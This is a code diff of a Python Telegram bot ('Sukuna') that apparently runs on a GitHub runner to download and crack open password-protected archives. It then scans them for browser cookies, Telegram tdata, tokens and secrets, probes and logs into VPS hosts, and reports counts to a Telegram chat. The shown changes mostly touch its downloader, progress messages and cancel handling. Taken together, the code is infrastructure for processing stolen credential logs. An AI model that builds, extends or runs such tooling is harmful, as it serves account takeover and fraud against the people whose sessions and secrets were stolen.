@@ -1,5 +1,4 @@
-
-import glob, json, multiprocessing, os, platform, queue, re, shutil, signal, socket, subprocess, sys, threading, time, zipfile
+import glob, json, multiprocessing, os, platform, queue, re, shutil, socket, subprocess, sys, threading, time, zipfile
 from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
@@ -16,7 +15,7 @@ except Exception:
 TG       = str(_TASK_.get("tg_token") or "")
 TG_API   = "https://api.telegram.org/bot" + TG + "/"
 CHAT     = None
-PB       = [0.0, None, None, 0, None]  # [last publish, card message id, job t0, publish count, last stage]
+PB       = [0.0, None, None, 0]  # [last publish, card message id, job t0, publish count]
 WORK  = Path("/tmp/job")
 OUT   = Path("/tmp/out")
 PROG  = OUT / "progress.json"
@@ -26,46 +25,21 @@ DOMS  = []
 _state = {"stage": "boot", "pct": 0, "err": None, "cores": CORES, "job": None}
 _flush = [0.0]
 
-RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
-STAGE_ICON = {
-    "boot": "🟡", "idle": "🟢", "installing": "🧩", "download": "📥", "downloaded": "✅",
-    "extract": "📦", "extracted": "✅", "wrong_password": "🔑", "scan": "🔍",
-    "authcheck": "🔎", "tdatacheck": "🗂",
-    "vps_probe": "🌐", "vps_login": "🔐", "vps_pack": "📤",
-    "packed": "🗃", "done": "🏁", "error": "❌", "cancelled": "🛑", "cancelling": "🛑",
-    "queued": "⏳", "retired": "♻️", "ttl_expired": "♻️",
-}
-HEADER_MARK = "◆"
+RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
+STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'tdatacheck': '🗂', 'vps_probe': '🌐', 'vps_login': '🔐', 'vps_pack': '📤', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
+HEADER_MARK = '◆'
 BAR_WIDTH = 10
-BAR_FULL = "█"
-BAR_EMPTY = "░"
+BAR_FULL = '█'
+BAR_EMPTY = '░'
 USE_BLOCKQUOTES = True
 EXPAND_LONG_HELP = True
-BOT_NAME = "Sukuna"
+BOT_NAME = 'Sukuna'
 VM_TTL = 3600
 class _Ref:
-    ref = "github-runner"
+    ref = 'rojaskomar67-ops/cookiebot-vm'
     born = time.time()
 vm = _Ref()
-
-def handle_cancel(sig, frame):
-    try:
-        if CHAT and PB[1]:
-            text = f"{HEADER_MARK} <b>CANCELLED</b>  ·  LOG SEARCH\n{RULE}\n🛑 <b>Job force-cancelled by operator.</b>\n🖥 <b>Job stopped.</b>"
-            requests.post(TG_API + "editMessageText", timeout=4, json={
-                "chat_id": CHAT, "message_id": PB[1], "text": text, "parse_mode": "HTML"
-            })
-    except Exception:
-        pass
-    sys.exit(0)
-
-try:
-    signal.signal(signal.SIGINT, handle_cancel)
-    signal.signal(signal.SIGTERM, handle_cancel)
-except Exception:
-    pass
-
 def bq(text: str, expand: bool = False) -> str:
     """Telegram block quote (optionally expandable) — clean, modern banner style."""
     if not USE_BLOCKQUOTES:
@@ -228,6 +202,7 @@ def live_text(job) -> str:
             f"⏳ {bold('Wall time')} {code(wall)}   🆔 {code(jid)}\n"
             f"🛑 Cancel: {code('/cancel ' + jid)}")
 
+
 def job_ctx():
     return {"prog": _state, "t0": PB[2] or time.time(), "id": _state.get("job") or "-"}
 
@@ -236,15 +211,11 @@ def pub(force=False):
     if not CHAT or not PB[1]:
         return
     n = time.time()
-    cur_stage = _state.get("stage")
-    stage_changed = (len(PB) > 4 and cur_stage != PB[4])
-    hot = force or stage_changed or cur_stage in ("done", "error", "cancelled",
-                                                  "wrong_password", "idle", "retired")
+    hot = force and _state.get("stage") in ("done", "error", "cancelled",
+                                            "wrong_password", "idle", "retired")
     if n - PB[0] < (0.5 if hot else 2.5):
         return
     PB[0] = n
-    if len(PB) > 4:
-        PB[4] = cur_stage
     try:
         r = requests.post(TG_API + "editMessageText", timeout=30, json={
             "chat_id": CHAT, "message_id": PB[1], "text": live_text(job_ctx()),
@@ -479,23 +450,7 @@ def resolve(url):
     handed to aria2c untouched. /info matters — plain /api/file/<id> IS the file."""
     host = pd_host(url)
     if host not in PD_HOSTS + PD_PROXIES:
-        fname, fsize = None, 0
-        resolved_url = url
-        try:
-            hr = requests.head(url, allow_redirects=True, timeout=10,
-                               headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
-            if hr.status_code < 400:
-                resolved_url = hr.url or url
-                cd = hr.headers.get("Content-Disposition") or ""
-                m = re.search(r'filename\*?=(?:UTF-8\'\')?"?([^";]+)"?', cd)
-                if m:
-                    fname = os.path.basename(m.group(1).strip().replace('"', ''))
-                cl = hr.headers.get("Content-Length")
-                if cl and cl.isdigit():
-                    fsize = int(cl)
-        except Exception:
-            pass
-        return resolved_url, fname, fsize, None
+        return url, None, 0, None
     kind, pid, item, err = pd_parts(url, host)
     if err:
         return None, None, 0, err
@@ -550,24 +505,14 @@ def download(url):
     if not shutil.which("aria2c"):
         st("installing", 3); apt(["aria2", "p7zip-full", "unrar-free"])
     use_aria = shutil.which("aria2c") is not None
-    is_internal = ("/dl/" in url) or ("trycloudflare.com" in url) or ("107.149.158.183" in url)
-    split_count = 4 if is_internal else 16
-    engine_name = "aria2c (%d-stream falloc)" % split_count if use_aria else "fast-parallel"
-    st("download", 4, engine=engine_name, file=fname, size=fsize)
+    st("download", 4, engine="aria2c (16 chunks)" if use_aria else "requests")
     t0 = time.time()
     found = None
     if use_aria:
-        cmd = [ "aria2c", "--dir", str(dest), f"--split={split_count}", f"--max-connection-per-server={split_count}",
-                "--min-split-size=1M", "--file-allocation=falloc",
-                "--disk-cache=64M", "--socket-recv-buffer-size=2M",
-                "--stream-piece-selector=default", "--piece-length=1M",
-                "--optimize-concurrent-downloads=true", "--auto-file-renaming=false",
+        cmd = [ "aria2c", "--dir", str(dest), "--split=16", "--max-connection-per-server=16",
+                "--min-split-size=1M", "--file-allocation=none", "--auto-file-renaming=false",
                 "--allow-overwrite=true", "--console-log-level=warn", "--summary-interval=1",
-                "--max-tries=10", "--retry-wait=2",
-                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-                "--header=Accept: */*" ]
-        if shutil.which("stdbuf"):
-            cmd = ["stdbuf", "-oL", "-eL"] + cmd
+                "--user-agent=Mozilla/5.0" ]
         if fname:
             cmd += ["--out", fname]
         cmd.append(url)
@@ -576,7 +521,6 @@ def download(url):
         pe = re.compile(r"\[#\w+\s+([\d.]+\w+)/([\d.]+\w+)\((\d+)%\)")
         se = re.compile(r"DL:([\d.]+\w+)")
         tail = []
-        last_dl_tick = 0.0
         for raw in pr.stdout:
             if stop():
                 pr.terminate(); return None
@@ -585,25 +529,21 @@ def download(url):
             m = pe.search(raw)
             if m:
                 s = se.search(raw)
-                pct_dl = 4 + int(m.group(3)) * 0.26
-                now_t = time.time()
-                if (pct_dl - _state.get("pct", 0) >= 3) or (now_t - last_dl_tick >= 2.5):
-                    last_dl_tick = now_t
-                    st("download", pct_dl, got=m.group(1),
-                       total=m.group(2) if fsize == 0 else fs(fsize),
-                       speed=(s.group(1) + "/s") if s else "-", elapsed=ft(now_t - t0),
-                       file=fname, size=fsize)
+                st("download", 4 + int(m.group(3)) * 0.26, got=m.group(1), total=m.group(2),
+                   speed=(s.group(1) + "/s") if s else "-", elapsed=ft(time.time() - t0))
             fm = re.search(r"Download complete:\s*(.+)", raw)
             if fm: found = fm.group(1).strip()
         pr.wait()
-        if fname and (dest / fname).is_file():
-            found = str(dest / fname)
         if pr.returncode not in (0, None):
-            sys.stdout.write("ARIA2 FAIL rc=%s, activating fast parallel engine\n" % pr.returncode)
+            sys.stdout.write("ARIA2 FAIL rc=%s\n%s\n" % (pr.returncode, "\n".join(tail)))
             sys.stdout.flush()
-            found = fast_parallel_dl(url, dest, fname, fsize, t0)
+            st("error", err="download_failed(rc=%s) %s" %
+               (pr.returncode, " ".join(tail[-3:])[:150]))
+            return None
     else:
-        found = fast_parallel_dl(url, dest, fname, fsize, t0)
+        found = slow_dl(url, dest, t0, fname)
+        if found is None:
+            st("error", err=_state.get("err") or "download_failed"); return None
     if not found or not os.path.isfile(found):
         cand = []
         for e in ("*.zip", "*.rar", "*.7z", "*.ZIP", "*.RAR"):
@@ -621,128 +561,22 @@ def download(url):
        dl_time=ft(time.time() - t0))
     return Path(found)
 
-def fast_parallel_dl(url, dest, fname=None, fsize=0, t0=None):
-    """High-throughput multi-connection parallel segment downloader using atomic
-    posix_fallocate + direct os.pwrite without seeking or locking races."""
-    import urllib.request, concurrent.futures
-    t0 = t0 or time.time()
-    dest = Path(dest)
-    dest.mkdir(parents=True, exist_ok=True)
-
-    total_size = fsize or 0
-    range_supported = False
-    final_url = url
-    try:
-        probe_req = urllib.request.Request(url, headers={
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-            'Range': 'bytes=0-0'
-        })
-        with urllib.request.urlopen(probe_req, timeout=15) as resp:
-            final_url = resp.geturl() or url
-            cr = resp.headers.get('Content-Range')
-            if cr and '/' in cr:
-                try: total_size = int(cr.split('/')[-1])
-                except Exception: pass
-                range_supported = True
-            elif resp.headers.get('Accept-Ranges') == 'bytes':
-                range_supported = True
-            if not total_size:
-                try: total_size = int(resp.headers.get('Content-Length') or 0)
-                except Exception: pass
-    except Exception:
-        pass
-
-    out_name = fname
-    if not out_name:
-        import urllib.parse
-        clean_path = urllib.parse.unquote(url.split('?')[0].rstrip('/').split('/')[-1])
-        out_name = clean_path if re.search(r'\.(zip|rar|7z|tar|gz)$', clean_path, re.I) else 'archive.bin'
-
-    tgt = dest / out_name
-    fd = os.open(str(tgt), os.O_RDWR | os.O_CREAT | os.O_TRUNC)
-
-    if total_size > 0:
-        try: os.posix_fallocate(fd, 0, total_size)
-        except Exception:
-            try: os.ftruncate(fd, total_size)
-            except Exception: pass
-
-    if range_supported and total_size > (4 * 1024 * 1024):
-        is_internal = ("/dl/" in final_url) or ("trycloudflare.com" in final_url) or ("107.149.158.183" in final_url)
-        workers = 4 if is_internal else min(16, max(4, (os.cpu_count() or 4) * 2))
-        chunk_size = total_size // workers
-        downloaded = [0]
-        lock = threading.Lock()
-        last_tick = [time.time()]
-
-        def worker_fetch(w_idx, start, end):
-            curr = start
-            retries = 3
-            while curr <= end and retries > 0:
-                if stop(): return
-                try:
-                    w_req = urllib.request.Request(final_url, headers={
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-                        'Range': f'bytes={curr}-{end}',
-                        'Accept': '*/*'
-                    })
-                    with urllib.request.urlopen(w_req, timeout=45) as r:
-                        while curr <= end:
-                            if stop(): return
-                            chunk = r.read(1024 * 1024)
-                            if not chunk: break
-                            os.pwrite(fd, chunk, curr)
-                            curr += len(chunk)
-                            with lock:
-                                downloaded[0] += len(chunk)
-                                done = downloaded[0]
-                                now_t = time.time()
-                                if now_t - last_tick[0] >= 2.0:
-                                    last_tick[0] = now_t
-                                    pct_dl = 4 + int(done * 26 // total_size)
-                                    el = now_t - t0
-                                    spd = fs(done / el) + "/s" if el > 0 else "-"
-                                    st("download", pct_dl, got=fs(done),
-                                       total=fs(total_size), speed=spd,
-                                       elapsed=ft(el), file=out_name, size=total_size)
-                except Exception:
-                    retries -= 1
-                    time.sleep(1)
-
-        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
-            futs = []
-            for i in range(workers):
-                st_pos = i * chunk_size
-                en_pos = total_size - 1 if i == workers - 1 else (i + 1) * chunk_size - 1
-                futs.append(ex.submit(worker_fetch, i, st_pos, en_pos))
-            for f in concurrent.futures.as_completed(futs):
-                if stop():
-                    os.close(fd); return None
-                f.result()
-    else:
-        # High-speed buffered stream fallback (2MB buffer)
-        req = urllib.request.Request(final_url, headers={'User-Agent': 'Mozilla/5.0'})
-        with urllib.request.urlopen(req, timeout=900) as r:
-            curr = 0
-            last_tick = time.time()
-            while True:
-                if stop():
-                    os.close(fd); return None
-                chunk = r.read(2 * 1024 * 1024)
-                if not chunk: break
-                os.write(fd, chunk)
-                curr += len(chunk)
-                now_t = time.time()
-                if now_t - last_tick >= 2.0:
-                    last_tick = now_t
-                    pct_dl = 4 + (curr * 26 // total_size if total_size else 0)
-                    el = now_t - t0
-                    spd = fs(curr / el) + "/s" if el > 0 else "-"
-                    st("download", pct_dl, got=fs(curr),
-                       total=fs(total_size) if total_size else "?", speed=spd,
-                       elapsed=ft(el), file=out_name, size=total_size)
-
-    os.close(fd)
+def slow_dl(url, dest, t0, name=None):
+    import requests
+    from urllib.parse import unquote
+    nm = name or unquote(url.split("?")[0].rstrip("/").split("/")[-1])
+    if not re.search(r"\.(zip|rar|7z)$", nm, re.I): nm = "archive.zip"
+    tgt = dest / nm
+    with requests.get(url, stream=True, timeout=900,
+                      headers={"User-Agent": "Mozilla/5.0"}) as r:
+        r.raise_for_status()
+        tot = int(r.headers.get("content-length") or 0); done = 0
+        with open(tgt, "wb") as f:
+            for ch in r.iter_content(1 << 20):
+                if stop(): return None
+                f.write(ch); done += len(ch)
+                st("download", 4 + (done * 26 // tot if tot else 0), got=fs(done),
+                   total=fs(tot) if tot else "?", elapsed=ft(time.time() - t0))
     return str(tgt)
 
 # ── 2. extract (all cores; tries every supplied password, never re-downloads) ──
@@ -1991,72 +1825,6 @@ def pack_secrets(files):
 
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
-    if stage == "done":
-        # 1. Delete the live console card message immediately
-        if CHAT and PB[1]:
-            try:
-                r = requests.post(TG_API + "deleteMessage", timeout=10, json={
-                    "chat_id": CHAT, "message_id": PB[1]
-                })
-                sys.stdout.write("Live card %s deleted, rc=%s\n" % (PB[1], r.status_code))
-                sys.stdout.flush()
-            except Exception as e:
-                sys.stdout.write("Delete live card err: %s\n" % e)
-                sys.stdout.flush()
-            PB[1] = None
-
-        # 2. Send Task Complete ✅
-        if CHAT:
-            try:
-                tot_elapsed = ft(time.time() - (PB[2] or time.time()))
-                is_vps = task.get("kind") in ("vps_promox", "vps_check")
-                if is_vps:
-                    lines = [
-                        "✦ <b>Task Complete ✅</b>",
-                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-                        "📦 <b>Status:</b> VPS scan completed",
-                        f"🔎 <b>Total:</b> <code>{extra.get('total', 0)}</code>",
-                        f"🌐 <b>Reachable:</b> <code>{extra.get('reach', extra.get('valid', 0))}</code>",
-                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
-                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
-                    ]
-                else:
-                    cookies_cnt = extra.get("cookies", 0)
-                    sent_cnt = len(extra.get("sent") or [])
-                    lines = [
-                        "✦ <b>Task Complete ✅</b>",
-                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-                        "📦 <b>Status:</b> All files extracted & delivered",
-                        f"📤 <b>Files sent:</b> <code>{sent_cnt}</code>",
-                        f"🍪 <b>Sessions:</b> <code>{cookies_cnt}</code>",
-                    ]
-                    if extra.get("td_total"):
-                        lines.append(f"🗃 <b>Tdata:</b> <code>{extra['td_total']}</code>")
-                    if extra.get("tok_total"):
-                        lines.append(f"🎟 <b>Tokens:</b> <code>{extra['tok_total']}</code>")
-                    if extra.get("js_total"):
-                        lines.append(f"🗂 <b>JSON:</b> <code>{extra['js_total']}</code>")
-                    if extra.get("sec_total"):
-                        lines.append(f"🗝 <b>Secrets:</b> <code>{extra['sec_total']}</code>")
-                    lines.extend([
-                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
-                        f"🧹 <b>Disk:</b> Wiped clean",
-                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
-                    ])
-                requests.post(TG_API + "sendMessage", timeout=15, json={
-                    "chat_id": CHAT,
-                    "text": "\n".join(lines),
-                    "parse_mode": "HTML",
-                    "reply_markup": {
-                        "inline_keyboard": [
-                            [{"text": "« Back to Menu", "callback_data": "menu_home"}]
-                        ]
-                    }
-                })
-            except Exception as e:
-                sys.stdout.write("Send Task Complete err: %s\n" % e)
-                sys.stdout.flush()
-
     st(stage, 100 if stage == "done" else _state.get("pct", 0),
        job=task.get("job"), vm=SPECS,
        **{k: extra[k] for k in extra if k in ("err", "tried")})
